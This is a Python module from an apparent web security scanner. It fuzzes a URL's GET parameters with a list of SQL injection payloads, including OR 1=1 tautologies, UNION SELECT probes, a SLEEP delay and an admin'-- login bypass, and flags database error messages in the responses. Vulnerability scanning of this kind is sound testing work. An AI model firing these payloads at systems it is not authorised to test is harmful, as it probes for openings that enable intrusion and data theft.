"""Basic SQL injection detection via GET parameter fuzzing."""
from __future__ import annotations

import threading
import urllib.parse
from typing import Callable

import requests
from requests.exceptions import RequestException

from .models import Finding

_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1--",
    "1' OR '1'='1",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1 OR 1=1",
    "' AND SLEEP(1)--",
    '" OR ""="',
]

_ERROR_SIGNATURES = [
    "sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "syntax error",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "org.postgresql",
    "psycopg2",
    "sqlite3.operationalerror",
    "warning: mysql",
    "ora-01756",
    "microsoft ole db",
    "odbc microsoft access",
    "jet database engine",
    "[microsoft][odbc",
    "[sql server]",
    "you have an error in your sql",
    "supplied argument is not a valid mysql",
]


def _get_params(url: str) -> dict[str, str]:
    parsed = urllib.parse.urlparse(url)
    return dict(urllib.parse.parse_qsl(parsed.query))


def _inject_url(url: str, params: dict[str, str]) -> str:
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.urlencode(params)
    return urllib.parse.urlunparse(parsed._replace(query=qs))


def fuzz(
    url: str,
    timeout: float,
    stop_event: threading.Event,
    on_finding: Callable[[Finding], None],
    on_progress: Callable[[str], None],
) -> list[Finding]:
    base_params = _get_params(url)
    if not base_params:
        on_progress("[!] No GET parameters in URL — nothing to fuzz.\n")
        on_progress("[*] Tip: Use a URL like http://target/search?q=test\n")
        return []

    session = requests.Session()
    session.headers["User-Agent"] = "CyberSuite/WAT SQLiFuzzer"
    findings: list[Finding] = []
    hit_params: set[str] = set()

    for param in base_params:
        for payload in _PAYLOADS:
            if stop_event.is_set():
                return findings
            if param in hit_params:
                break
            test_params = {**base_params, param: payload}
            test_url = _inject_url(url, test_params)
            on_progress(f"[*] {param} → {payload[:30]}\n")
            try:
                r = session.get(test_url, timeout=timeout)
                body = r.text.lower()
                for sig in _ERROR_SIGNATURES:
                    if sig in body:
                        f = Finding(
                            type="sqli_hit",
                            severity="CRITICAL",
                            url=test_url,
                            detail=f"SQL error '{sig}' triggered on param '{param}'",
                            evidence={"param": param, "payload": payload, "signature": sig},
                        )
                        findings.append(f)
                        on_finding(f)
                        hit_params.add(param)
                        break
            except RequestException:
                pass

    return findings
